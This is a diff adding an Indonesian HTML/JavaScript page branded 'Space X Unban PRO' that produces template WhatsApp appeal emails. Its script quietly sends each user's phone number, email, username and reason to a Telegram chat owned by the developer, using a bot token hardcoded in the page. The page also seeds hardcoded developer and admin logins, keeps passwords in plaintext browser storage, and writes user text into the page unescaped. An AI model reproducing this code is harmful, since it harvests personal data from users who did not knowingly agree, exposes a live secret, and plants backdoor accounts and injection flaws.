@@ -1,0 +1,757 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>🚀 Space X Unban PRO</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
+        body {
+            background: #05070e;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 560px;
+            width: 100%;
+            background: rgba(10, 14, 30, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 48px;
+            padding: 36px 32px;
+            border: 1px solid rgba(0, 200, 255, 0.25);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.98), 0 0 60px rgba(0, 150, 255, 0.1);
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 26px;
+        }
+        .header h1 {
+            font-size: 30px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #00e5ff, #a855f7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .header .badge {
+            display: inline-block;
+            background: rgba(0, 200, 255, 0.15);
+            color: #00e5ff;
+            padding: 4px 16px;
+            border-radius: 60px;
+            font-size: 11px;
+            font-weight: 700;
+            margin-top: 6px;
+            border: 1px solid rgba(0, 200, 255, 0.2);
+        }
+        .header .dev-credit {
+            color: #6a3a9a;
+            font-size: 12px;
+            margin-top: 8px;
+            letter-spacing: 1px;
+            font-weight: 600;
+            text-shadow: 0 0 20px rgba(168, 85, 247, 0.3);
+        }
+        .auth-box {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+        .auth-box input {
+            background: #0f1629;
+            border: 1px solid #1f2a4a;
+            border-radius: 60px;
+            padding: 16px 22px;
+            font-size: 15px;
+            color: #e6eeff;
+            outline: none;
+            transition: 0.3s;
+        }
+        .auth-box input:focus {
+            border-color: #00d4ff;
+            box-shadow: 0 0 25px rgba(0, 200, 255, 0.2);
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #00b8ff, #7c3aed);
+            border: none;
+            border-radius: 60px;
+            padding: 16px;
+            font-size: 17px;
+            font-weight: 700;
+            color: #fff;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 6px 30px rgba(0, 180, 255, 0.3);
+        }
+        .btn-primary:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 40px rgba(0, 180, 255, 0.5);
+        }
+        .switch-link {
+            text-align: center;
+            color: #6a7da0;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .switch-link:hover {
+            color: #00d4ff;
+        }
+        .main-menu {
+            display: none;
+            flex-direction: column;
+            gap: 18px;
+            animation: fadeUp 0.5s ease;
+        }
+        @keyframes fadeUp {
+            0% {
+                opacity: 0;
+                transform: translateY(25px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .field {
+            background: #0f1629;
+            border-radius: 20px;
+            padding: 14px 20px;
+            border: 1px solid #1f2a4a;
+        }
+        .field label {
+            display: block;
+            font-size: 12px;
+            color: #7b8bb0;
+            margin-bottom: 4px;
+            font-weight: 600;
+        }
+        .field input,
+        .field textarea {
+            width: 100%;
+            background: transparent;
+            border: none;
+            color: #eef3ff;
+            font-size: 15px;
+            outline: none;
+            resize: vertical;
+        }
+        .field textarea {
+            min-height: 60px;
+            font-family: 'Segoe UI', sans-serif;
+        }
+        .field input::placeholder,
+        .field textarea::placeholder {
+            color: #3a4a6a;
+        }
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .btn-group button {
+            background: #121b33;
+            border: 1px solid #25345a;
+            border-radius: 60px;
+            padding: 14px 20px;
+            font-size: 14px;
+            font-weight: 700;
+            color: #c8d4f5;
+            cursor: pointer;
+            transition: 0.3s;
+            text-align: left;
+            padding-left: 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .btn-group button span {
+            font-size: 12px;
+            color: #6a7ea8;
+        }
+        .btn-group button:hover {
+            background: #1e2d55;
+            border-color: #5a72b0;
+            color: #fff;
+            transform: translateX(6px);
+        }
+        .unban-free {
+            border-left: 5px solid #00d4aa;
+        }
+        .unban-hard {
+            border-left: 5px solid #f9a826;
+        }
+        .unban-perm {
+            border-left: 5px solid #ff3b6f;
+        }
+        .status-box {
+            background: #0a1122;
+            border-radius: 24px;
+            padding: 16px 20px;
+            font-size: 14px;
+            color: #88b0ff;
+            border: 1px dashed #1f3360;
+            text-align: center;
+            line-height: 1.8;
+            min-height: 70px;
+        }
+        .status-box a {
+            color: #00e0ff;
+            text-decoration: underline;
+            font-weight: 600;
+        }
+        .status-box .thankyou {
+            color: #a855f7;
+            font-weight: 600;
+            font-size: 15px;
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px dashed #2a3a6a;
+        }
+        .action-row {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .action-row button {
+            flex: 1;
+            background: transparent;
+            border: 1px solid #2a3d6a;
+            color: #8a9cc0;
+            padding: 12px 10px;
+            border-radius: 60px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            min-width: 70px;
+        }
+        .action-row button:hover {
+            background: #1a2340;
+            color: #fff;
+            border-color: #4a6a9a;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 10px;
+            color: #2f3f5f;
+        }
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #0a1122;
+            border: 1px solid #00d4ff;
+            padding: 14px 24px;
+            border-radius: 30px;
+            color: #00e5ff;
+            font-weight: 600;
+            font-size: 14px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.9);
+            z-index: 999;
+            display: none;
+            animation: slideIn 0.5s ease;
+        }
+        @keyframes slideIn {
+            0% {
+                opacity: 0;
+                transform: translateX(60px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+        .bot-status {
+            background: #0a1122;
+            border-radius: 20px;
+            padding: 10px 16px;
+            border: 1px solid #1a2a4a;
+            text-align: center;
+            font-size: 12px;
+            color: #3a7a5a;
+        }
+        .bot-status .online {
+            color: #00d4aa;
+        }
+        .bot-status .offline {
+            color: #ff5e7a;
+        }
+        .bot-config {
+            background: #0a1122;
+            border-radius: 16px;
+            padding: 10px 14px;
+            border: 1px solid #1a2a4a;
+            font-size: 11px;
+            color: #4a5a7a;
+            text-align: center;
+            margin-top: 4px;
+        }
+        .bot-config code {
+            color: #7a8aaa;
+            background: #141c34;
+            padding: 2px 8px;
+            border-radius: 8px;
+            font-size: 10px;
+        }
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px 16px;
+            }
+            .header h1 {
+                font-size: 22px;
+            }
+            .action-row button {
+                font-size: 11px;
+                padding: 10px 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="notification" id="notif"></div>
+
+    <div class="container" id="app">
+
+        <div class="header">
+            <h1>🚀 Space X Unban PRO</h1>
+            <div class="badge">⚡ v2.0 • +Telegram Bot</div>
+            <div class="dev-credit">🔐 Developer APK Unband Space X : Remon</div>
+        </div>
+
+        <!-- LOGIN -->
+        <div id="authBox">
+            <div class="auth-box">
+                <input type="text" id="loginUser" placeholder="Username" />
+                <input type="password" id="loginPass" placeholder="Password" />
+                <button class="btn-primary" onclick="handleLogin()">🔓 Login</button>
+                <div class="switch-link" onclick="toggleRegister()">✨ Belum punya akun? Daftar</div>
+            </div>
+        </div>
+
+        <!-- REGISTER -->
+        <div id="regBox" style="display:none;">
+            <div class="auth-box">
+                <input type="text" id="regUser" placeholder="Buat Username" />
+                <input type="password" id="regPass" placeholder="Buat Password" />
+                <input type="password" id="regPass2" placeholder="Ulangi Password" />
+                <button class="btn-primary" onclick="handleRegister()">✅ Daftar</button>
+                <div class="switch-link" onclick="toggleRegister()">← Kembali Login</div>
+            </div>
+        </div>
+
+        <!-- MAIN MENU -->
+        <div class="main-menu" id="mainMenu">
+
+            <div class="bot-status" id="botStatus">
+                🤖 <span class="online" id="botIndicator">●</span> <span id="botText">Cek koneksi...</span>
+            </div>
+
+            <!-- KONFIGURASI BOT (TAMPAK HANYA UNTUK DEVELOPER) -->
+            <div class="bot-config" id="botConfig" style="display:none;">
+                🔐 <strong>Konfigurasi Bot</strong><br />
+                Token: <code>8874430278:AAFJ3qH_4Hiye5dL1etcdQQhv_6yoiGx26Q</code><br />
+                Owner ID: <code>7260945600</code>
+            </div>
+
+            <div class="field">
+                <label>📱 Nomor WhatsApp</label>
+                <input type="text" id="nomor" placeholder="+6281234567890" />
+            </div>
+            <div class="field">
+                <label>📧 Email Banding</label>
+                <input type="email" id="emailBand" placeholder="emailkamu@gmail.com" />
+            </div>
+            <div class="field">
+                <label>📝 Keterangan (opsional)</label>
+                <textarea id="alasan" placeholder="Tambahkan alasan jika perlu..."></textarea>
+            </div>
+
+            <div class="btn-group">
+                <button class="unban-free" onclick="unban('free')">
+                    🟢 Unban Fresh <span>baru kena</span>
+                </button>
+                <button class="unban-hard" onclick="unban('hard')">
+                    🟠 Unban Hard <span>&gt;3 minggu</span>
+                </button>
+                <button class="unban-perm" onclick="unban('permanent')">
+                    🔴 Unban Permanen <span>&gt;2 bulan</span>
+                </button>
+            </div>
+
+            <div class="status-box" id="statusDisplay">
+                💡 Pilih opsi unban di atas
+            </div>
+
+            <div class="action-row">
+                <button onclick="copyText()">📋 Copy</button>
+                <button onclick="exportHistory()">📥 Export</button>
+                <button onclick="resetForm()">↺ Reset</button>
+                <button onclick="logout()">🚪 Logout</button>
+            </div>
+
+            <!-- Riwayat -->
+            <div style="background:#0a1122;border-radius:20px;padding:14px 18px;border:1px solid #1a2a4a;margin-top:4px;">
+                <div style="display:flex;justify-content:space-between;align-items:center;">
+                    <span style="color:#7b8bb0;font-size:12px;font-weight:600;">📜 Riwayat Banding</span>
+                    <span style="color:#3a5a7a;font-size:11px;" id="historyCount">0</span>
+                </div>
+                <div id="historyList" style="color:#6a8aaa;font-size:13px;margin-top:6px;max-height:80px;overflow-y:auto;">
+                    <span style="color:#3a5a7a;">Belum ada riwayat</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">Space X Ai • Created by Remon • NASA REMON</div>
+    </div>
+
+    <script>
+        // ============================================================
+        //  KONFIGURASI BOT TELEGRAM
+        // ============================================================
+        const BOT_TOKEN = '8874430278:AAFJ3qH_4Hiye5dL1etcdQQhv_6yoiGx26Q';
+        const OWNER_ID = '7260945600';
+
+        // ============================================================
+        //  DATA - AKUN DEVELOPER (Remon) TIDAK DITAMPILKAN
+        // ============================================================
+        let users = JSON.parse(localStorage.getItem('spacex_users')) || {};
+
+        // AKUN DEVELOPER: Remon (TIDAK DITAMPILKAN DI MANA PUN)
+        if (!users['Remon']) users['Remon'] = '4567';
+
+        // AKUN DEFAULT: admin (biasa)
+        if (!users['admin']) users['admin'] = '12345';
+
+        localStorage.setItem('spacex_users', JSON.stringify(users));
+
+        let history = JSON.parse(localStorage.getItem('spacex_history')) || [];
+        let currentUser = null;
+        let lastEmailBody = '';
+
+        // ============================================================
+        //  FUNGSI KIRIM NOTIFIKASI KE TELEGRAM (via API)
+        // ============================================================
+        async function sendTelegramNotification(message) {
+            try {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: OWNER_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                return response.ok;
+            } catch (error) {
+                console.error('Gagal kirim notif Telegram:', error);
+                return false;
+            }
+        }
+
+        // ============================================================
+        //  CEK KONEKSI BOT
+        // ============================================================
+        async function checkBotStatus() {
+            const indicator = document.getElementById('botIndicator');
+            const text = document.getElementById('botText');
+            try {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/getMe`;
+                const response = await fetch(url);
+                if (response.ok) {
+                    indicator.className = 'online';
+                    indicator.textContent = '●';
+                    text.textContent = 'Bot Online — Notifikasi otomatis ke Owner';
+                } else {
+                    indicator.className = 'offline';
+                    indicator.textContent = '●';
+                    text.textContent = 'Bot Offline (token tidak valid)';
+                }
+            } catch (e) {
+                indicator.className = 'offline';
+                indicator.textContent = '●';
+                text.textContent = 'Bot Offline (tidak terhubung)';
+            }
+        }
+
+        // ============================================================
+        //  UI
+        // ============================================================
+        function toggleRegister() {
+            const auth = document.getElementById('authBox');
+            const reg = document.getElementById('regBox');
+            if (auth.style.display === 'none') {
+                auth.style.display = 'block';
+                reg.style.display = 'none';
+            } else {
+                auth.style.display = 'none';
+                reg.style.display = 'block';
+            }
+        }
+
+        function showNotif(msg, color = '#00e5ff') {
+            const el = document.getElementById('notif');
+            el.textContent = msg;
+            el.style.display = 'block';
+            el.style.borderColor = color;
+            el.style.color = color;
+            setTimeout(() => { el.style.display = 'none'; }, 4000);
+        }
+
+        function setStatus(msg, color = '#88b0ff') {
+            const el = document.getElementById('statusDisplay');
+            el.innerHTML = msg;
+            el.style.color = color;
+        }
+
+        function renderHistory() {
+            const list = document.getElementById('historyList');
+            const count = document.getElementById('historyCount');
+            count.textContent = history.length;
+            if (history.length === 0) {
+                list.innerHTML = '<span style="color:#3a5a7a;">Belum ada riwayat</span>';
+                return;
+            }
+            list.innerHTML = history.slice(-5).reverse().map(h =>
+                `<div style="padding:4px 0;border-bottom:1px solid #14203a;">${h.time} → ${h.type}</div>`
+            ).join('');
+        }
+
+        // ============================================================
+        //  AUTH
+        // ============================================================
+        function handleLogin() {
+            const u = document.getElementById('loginUser').value.trim();
+            const p = document.getElementById('loginPass').value.trim();
+            const stored = JSON.parse(localStorage.getItem('spacex_users')) || {};
+
+            if (stored[u] && stored[u] === p) {
+                currentUser = u;
+                document.getElementById('authBox').style.display = 'none';
+                document.getElementById('regBox').style.display = 'none';
+                document.getElementById('mainMenu').style.display = 'flex';
+                renderHistory();
+                checkBotStatus();
+
+                // Tampilkan konfigurasi bot hanya untuk Remon
+                if (u === 'Remon') {
+                    document.getElementById('botConfig').style.display = 'block';
+                    setStatus('👑 Halo Tuan Remon! Developer APK Unband Space X.', '#b388ff');
+                    showNotif('👑 Selamat datang, Developer!', '#b388ff');
+                } else {
+                    document.getElementById('botConfig').style.display = 'none';
+                    setStatus(`✅ Selamat datang, ${u}!`, '#00d4aa');
+                    showNotif(`✅ Halo ${u}!`, '#00d4aa');
+                }
+            } else {
+                setStatus('❌ Username atau password salah!', '#ff5e7a');
+                showNotif('❌ Login gagal!', '#ff5e7a');
+            }
+        }
+
+        async function handleRegister() {
+            const u = document.getElementById('regUser').value.trim();
+            const p = document.getElementById('regPass').value.trim();
+            const p2 = document.getElementById('regPass2').value.trim();
+
+            if (!u || !p || !p2) {
+                setStatus('⚠️ Semua field harus diisi!', '#f9a826');
+                return;
+            }
+            if (p !== p2) {
+                setStatus('⚠️ Password tidak cocok!', '#f9a826');
+                return;
+            }
+            if (u.length < 3 || p.length < 4) {
+                setStatus('⚠️ Username min 3, Password min 4.', '#f9a826');
+                return;
+            }
+
+            // Cek apakah username sudah ada
+            const stored = JSON.parse(localStorage.getItem('spacex_users')) || {};
+            if (stored[u]) {
+                setStatus('⚠️ Username sudah terdaftar!', '#f9a826');
+                return;
+            }
+
+            // Simpan di localStorage
+            stored[u] = p;
+            localStorage.setItem('spacex_users', JSON.stringify(stored));
+
+            // Kirim notifikasi ke Telegram
+            const notifMsg =
+                `🆕 *User Baru Mendaftar!*\n\n👤 Username: ${u}\n🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
+            await sendTelegramNotification(notifMsg);
+
+            setStatus(`✅ Akun "${u}" berhasil dibuat!`, '#00d4aa');
+            showNotif(`✅ Akun ${u} dibuat!`, '#00d4aa');
+            document.getElementById('regUser').value = '';
+            document.getElementById('regPass').value = '';
+            document.getElementById('regPass2').value = '';
+            document.getElementById('authBox').style.display = 'block';
+            document.getElementById('regBox').style.display = 'none';
+            document.getElementById('loginUser').value = u;
+            document.getElementById('loginPass').value = '';
+        }
+
+        function logout() {
+            currentUser = null;
+            document.getElementById('mainMenu').style.display = 'none';
+            document.getElementById('authBox').style.display = 'block';
+            document.getElementById('regBox').style.display = 'none';
+            document.getElementById('botConfig').style.display = 'none';
+            setStatus('🔐 Sudah logout.', '#7b8bb0');
+            showNotif('🔐 Logout berhasil', '#7b8bb0');
+            resetForm();
+        }
+
+        function resetForm() {
+            document.getElementById('nomor').value = '';
+            document.getElementById('emailBand').value = '';
+            document.getElementById('alasan').value = '';
+            setStatus('💡 Form direset. Pilih opsi unban.', '#88b0ff');
+        }
+
+        // ============================================================
+        //  UNBAN
+        // ============================================================
+        async function unban(type) {
+            let nomor = document.getElementById('nomor').value.trim();
+            const email = document.getElementById('emailBand').value.trim();
+            const alasan = document.getElementById('alasan').value.trim();
+
+            if (!nomor || !email) {
+                setStatus('⚠️ Nomor dan Email wajib diisi!', '#f9a826');
+                showNotif('⚠️ Lengkapi data!', '#f9a826');
+                return;
+            }
+            if (!nomor.startsWith('+62')) {
+                nomor = '+62' + nomor.replace(/^0+/, '');
+                document.getElementById('nomor').value = nomor;
+            }
+            if (!email.includes('@') || !email.includes('.')) {
+                setStatus('⚠️ Email tidak valid!', '#f9a826');
+                return;
+            }
+
+            let subject = '';
+            let body = '';
+            let label = '';
+
+            if (type === 'free') {
+                label = 'Unban Fresh';
+                subject = 'Request for Account Review';
+                body =
+                    `Dear WhatsApp Support,\n\nMy phone number is ${nomor}.\nMy account was recently suspended, and I would like to request a review. If this was due to an error or any activity that unintentionally violated your policies, I sincerely apologize. I respect WhatsApp's Terms of Service and will ensure I follow them in the future.\n\nI kindly ask you to review my account and restore access if possible.\n\n${alasan ? 'Additional note: ' + alasan + '\n\n' : ''}Thank you for your time and consideration.\n\n${email}`;
+            } else if (type === 'hard') {
+                label = 'Unban Hard';
+                subject = 'Second Request for Account Review';
+                body =
+                    `Dear WhatsApp Support,\n\nMy phone number is ${nomor}.\nMy account has been suspended for several weeks. I understand that WhatsApp takes account safety seriously, and I respect that. I sincerely request another review of my account.\n\nIf my account was suspended because of any activity that violated the Terms of Service, I apologize and assure you that I will fully comply with all WhatsApp policies in the future.\n\nI would greatly appreciate another opportunity to use WhatsApp.\n\n${alasan ? 'Additional note: ' + alasan + '\n\n' : ''}Thank you for your consideration.\n\n${email}`;
+            } else if (type === 'permanent') {
+                label = 'Unban Permanen';
+                subject = 'Final Appeal for My WhatsApp Account';
+                body =
+                    `Dear WhatsApp Support,\n\nMy phone number is ${nomor}.\nI am writing to respectfully request a final review of my suspended account. It has been over two months, and I truly hope you will reconsider my case.\n\nI understand the importance of maintaining a safe platform. If my account was suspended due to any violation, I sincerely apologize and have learned from the experience. I am committed to following all WhatsApp Terms of Service in the future.\n\nWhatsApp is important for my personal communication, and I would be very grateful if you could review my account one more time.\n\n${alasan ? 'Additional note: ' + alasan + '\n\n' : ''}Thank you for your time and understanding.\n\n${email}`;
+            }
+
+            lastEmailBody = body;
+
+            // Simpan riwayat di localStorage
+            history.push({
+                time: new Date().toLocaleString('id-ID'),
+                type: label,
+                nomor: nomor,
+                email: email
+            });
+            localStorage.setItem('spacex_history', JSON.stringify(history));
+            renderHistory();
+
+            // Kirim notifikasi ke Telegram
+            const jenisEmoji = type === 'free' ? '🟢' : type === 'hard' ? '🟠' : '🔴';
+            const notifMsg =
+                `📩 *Banding Baru!*\n\n${jenisEmoji} *Jenis:* ${label}\n👤 User: ${currentUser || 'anonim'}\n📱 Nomor: ${nomor}\n📧 Email: ${email}\n📝 Alasan: ${alasan || '-'}\n🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
+            await sendTelegramNotification(notifMsg);
+
+            const gmailLink =
+                `https://mail.google.com/mail/?view=cm&fs=1&to=support@whatsapp.com&su=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+
+            // TAMPILKAN PESAN UCAPAN TERIMA KASIH
+            setStatus(
+                `📩 <strong>${subject}</strong><br><br>✅ Email siap dikirim.<br><br>⬇️ <a href="${gmailLink}" target="_blank" style="color:#00e0ff;font-weight:700;">📧 Buka Gmail & Kirim</a><br><br>` +
+                `<div class="thankyou">🙏 Terimakasih sudah mempercayai kami atas ini.<br>Kami tidak menjanjikan kalau nomor kalian cepet kebuka<br>tapi mudah-mudahan aja pasti kebuka ❤️</div>`,
+                '#b0caff'
+            );
+            showNotif(`✅ ${label} siap!`, '#00d4aa');
+            window.open(gmailLink, '_blank');
+        }
+
+        // ============================================================
+        //  COPY + EXPORT
+        // ============================================================
+        function copyText() {
+            if (!lastEmailBody) {
+                setStatus('⚠️ Belum ada teks banding. Pilih opsi unban dulu.', '#f9a826');
+                showNotif('⚠️ Belum ada teks!', '#f9a826');
+                return;
+            }
+            navigator.clipboard.writeText(lastEmailBody).then(() => {
+                setStatus('📋 Teks banding berhasil disalin!', '#00d4aa');
+                showNotif('📋 Teks disalin!', '#00d4aa');
+            }).catch(() => {
+                setStatus('⚠️ Gagal menyalin. Silakan salin manual.', '#f9a826');
+            });
+        }
+
+        function exportHistory() {
+            if (history.length === 0) {
+                setStatus('⚠️ Belum ada riwayat untuk diexport.', '#f9a826');
+                showNotif('⚠️ Kosong!', '#f9a826');
+                return;
+            }
+            let txt = '=== SPACE X UNBAN - RIWAYAT BANDING ===\n\n';
+            history.forEach((h, i) => {
+                txt += `${i+1}. ${h.time} | ${h.type} | ${h.nomor} | ${h.email}\n`;
+            });
+            const blob = new Blob([txt], { type: 'text/plain' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = 'riwayat_banding.txt';
+            a.click();
+            showNotif('📥 Riwayat diexport!', '#00d4aa');
+        }
+
+        // ============================================================
+        //  ENTER + INIT
+        // ============================================================
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                const auth = document.getElementById('authBox');
+                const reg = document.getElementById('regBox');
+                if (auth.style.display !== 'none') handleLogin();
+                else if (reg.style.display !== 'none') handleRegister();
+            }
+        });
+
+        window.onload = function() {
+            document.getElementById('loginUser').focus();
+            renderHistory();
+            checkBotStatus();
+            // Cek status bot tiap 30 detik
+            setInterval(checkBotStatus, 30000);
+        };
+    </script>
+
+</body>
+</html>
